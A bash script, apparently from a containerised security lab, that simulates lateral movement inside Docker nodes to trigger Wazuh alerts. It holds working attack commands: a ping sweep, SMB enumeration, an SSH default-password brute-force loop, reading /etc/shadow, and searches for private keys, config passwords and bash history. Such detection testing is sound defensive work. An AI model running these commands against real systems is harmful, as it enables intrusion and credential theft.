#!/bin/bash
# Angriffsszenario 7: Lateral Movement
# Simuliert laterale Bewegung im Netzwerk

echo "=== Lateral Movement Angriff Szenario ==="
echo "Dieser Angriff simuliert laterale Bewegung zwischen Netzwerk-Segmenten"
echo ""

START_NODE="${1:-webserver}"

echo "[+] Starte Lateral Movement Simulation von $START_NODE"

# Netzwerk-Reconnaissance
echo "[*] Netzwerk-Reconnaissance..."
sudo docker exec clab-dmz-project-sun-$START_NODE bash -c "
    # Installiere Tools
    apt-get update -qq && apt-get install -y nmap netcat-openbsd -qq 2>/dev/null || true
    
    # Entdecke andere Hosts im Netzwerk
    echo '[*] Scanne lokales Netzwerk...'
    ip addr show | grep inet
    
    # ARP Scan
    arp -a 2>/dev/null || true
    
    # Ping Sweep
    for i in {1..254}; do
        ping -c 1 -W 1 172.20.20.\$i 2>/dev/null | grep 'bytes from' &
    done
    wait
"

# SMB/CIFS Enumeration
echo "[*] SMB Enumeration..."
sudo docker exec clab-dmz-project-sun-$START_NODE bash -c "
    # Installiere smbclient
    apt-get install -y smbclient -qq 2>/dev/null || true
    
    # Versuche SMB Shares zu enumerieren
    for host in db-backend client-internal; do
        echo \"[*] Enumeriere \$host...\"
        smbclient -L //\$host -N 2>/dev/null || true
    done
"

# SSH Lateral Movement
echo "[*] SSH Lateral Movement Versuche..."
TARGETS=("db-backend" "client-internal" "wazuh-manager")

for target in "${TARGETS[@]}"; do
    echo "[*] Versuche SSH zu $target..."
    sudo docker exec clab-dmz-project-sun-$START_NODE bash -c "
        # Versuche mit verschiedenen Credentials
        for user in root admin user; do
            for pass in password admin root 123456; do
                sshpass -p \"\$pass\" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
                    \$user@$target 'whoami' 2>/dev/null && echo '[!] Erfolg: \$user@$target' || true
            done
        done
    "
done

# Pass-the-Hash Simulation
echo "[*] Simuliere Pass-the-Hash Angriff..."
sudo docker exec clab-dmz-project-sun-$START_NODE bash -c "
    # Extrahiere 'Hashes' (Simulation)
    echo '[*] Extrahiere Credentials...'
    cat /etc/shadow 2>/dev/null | head -5 || true
    
    # Simuliere Hash-Verwendung
    echo '[*] Versuche Hash-Authentifizierung...'
"

# RDP Brute Force (wenn Windows-Hosts vorhanden wären)
echo "[*] Simuliere RDP Enumeration..."
sudo docker exec clab-dmz-project-sun-$START_NODE bash -c "
    # Scanne nach RDP Port
    for host in db-backend client-internal; do
        nc -zv \$host 3389 -w 2 2>&1 | grep succeeded && echo \"[!] RDP offen auf \$host\" || true
    done
"

# WMI/PSExec Simulation
echo "[*] Simuliere WMI/PSExec laterale Bewegung..."
sudo docker exec clab-dmz-project-sun-$START_NODE bash -c "
    # Installiere impacket Tools
    apt-get install -y python3-pip -qq 2>/dev/null || true
    pip3 install impacket -q 2>/dev/null || true
    
    # Versuche PSExec (wird fehlschlagen, aber erzeugt Logs)
    for target in db-backend client-internal; do
        echo \"[*] PSExec Versuch zu \$target...\"
        # psexec.py administrator:password@\$target 2>/dev/null || true
    done
"

# Credential Dumping
echo "[*] Simuliere Credential Dumping..."
sudo docker exec clab-dmz-project-sun-$START_NODE bash -c "
    # Suche nach Credential-Dateien
    find /home -name '*.key' -o -name '*.pem' -o -name 'id_rsa' 2>/dev/null | head -10
    
    # Suche nach Passwörtern in Konfigurationsdateien
    grep -r 'password' /etc/ 2>/dev/null | head -10 || true
    
    # Bash History
    cat ~/.bash_history 2>/dev/null | grep -i 'password\|ssh\|scp' | head -10 || true
"

# Pivoting Simulation
echo "[*] Simuliere Pivoting..."
sudo docker exec clab-dmz-project-sun-$START_NODE bash -c "
    # Setze Port Forwarding auf (Simulation)
    echo '[*] Richte Port Forwarding ein...'
    # ssh -L 8080:db-backend:80 user@internal-firewall (Simulation)
    
    # Erstelle SOCKS Proxy (Simulation)
    echo '[*] Erstelle SOCKS Proxy...'
    # ssh -D 1080 user@internal-firewall (Simulation)
"

echo ""
echo "[+] Lateral Movement Simulation abgeschlossen"
echo "[+] Überprüfe Wazuh Dashboard für Alerts: https://localhost:8443"
echo "[+] Suche nach: 'lateral movement', 'network scan', 'credential access', 'ssh brute force'"
